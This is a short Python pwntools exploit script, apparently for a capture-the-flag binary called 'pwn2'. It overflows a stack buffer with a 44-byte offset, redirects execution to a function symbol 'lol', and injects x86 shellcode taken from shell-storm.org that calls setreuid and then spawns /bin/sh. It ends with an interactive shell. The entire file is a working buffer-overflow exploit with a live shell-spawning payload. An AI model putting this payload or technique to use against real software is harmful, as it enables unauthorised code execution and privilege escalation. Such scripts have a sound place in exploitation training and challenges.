from pwn import * 

e = ELF('./pwn2') 

offset = 44 
garbage = b'a' * offset 
# http://shell-storm.org/shellcode/ 
shellcode = b"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80" 
target_address = p32(e.symbols['lol']) 
msgin = garbage + target_address + shellcode 

p = process('./pwn2') 
p.sendline(msgin) 
p.interactive() 
